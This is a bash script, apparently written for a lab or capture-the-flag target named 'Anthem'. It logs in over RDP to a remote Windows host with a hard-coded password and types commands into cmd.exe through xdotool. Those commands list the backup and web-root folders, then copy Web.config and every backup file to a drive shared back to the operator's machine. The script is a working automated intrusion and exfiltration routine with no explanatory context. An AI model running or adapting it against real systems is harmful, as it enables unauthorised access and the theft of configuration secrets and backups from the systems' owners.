#!/bin/bash
export DISPLAY=:99
rm -f /tmp/.X99-lock
Xvfb :99 -screen 0 1280x800x24 >/dev/null 2>&1 &
XPID=$!
sleep 2
xfreerdp3 /v:10.48.191.46 /u:SG /p:'UmbracoIsTheBest!' /cert:ignore \
  /size:1280x800 /drive:share,/home/shrdx/Documents/Anthem \
  /log-level:ERROR >/home/shrdx/Documents/Anthem/rdp_sg4.log 2>&1 &
RPID=$!
for i in $(seq 1 60); do
  WID=$(xdotool search --onlyvisible --name "FreeRDP" 2>/dev/null | head -1)
  [ -n "$WID" ] && break
  sleep 1
done
sleep 18
focus() { xdotool windowactivate "$WID" 2>/dev/null; xdotool windowfocus "$WID" 2>/dev/null; sleep 1; }
typ() { xdotool type --clearmodifiers --delay 20 "$1" 2>/dev/null; sleep 1; }
key() { xdotool key --clearmodifiers "$1" 2>/dev/null; sleep 1; }
focus
key super+r
sleep 2
typ 'cmd.exe'
key Return
sleep 5
run() { typ "$1"; key Return; sleep 2; }

run 'dir /a /s C:\backup > \\tsclient\share\backup.txt 2>&1'
run 'dir /a C:\inetpub > \\tsclient\share\inetpub.txt 2>&1'
run 'dir /a C:\inetpub\wwwroot > \\tsclient\share\wwwroot.txt 2>&1'
run 'type C:\inetpub\wwwroot\Web.config > \\tsclient\share\webconfig.txt 2>&1'
run 'dir /a C:\backup > \\tsclient\share\backup_top.txt 2>&1'
run 'type C:\backup\* > \\tsclient\share\backup_all.txt 2>&1'
sleep 3
import -window root "/home/shrdx/Documents/Anthem/s4_final.png" 2>/dev/null
kill $RPID 2>/dev/null; sleep 1; kill $XPID 2>/dev/null
echo done
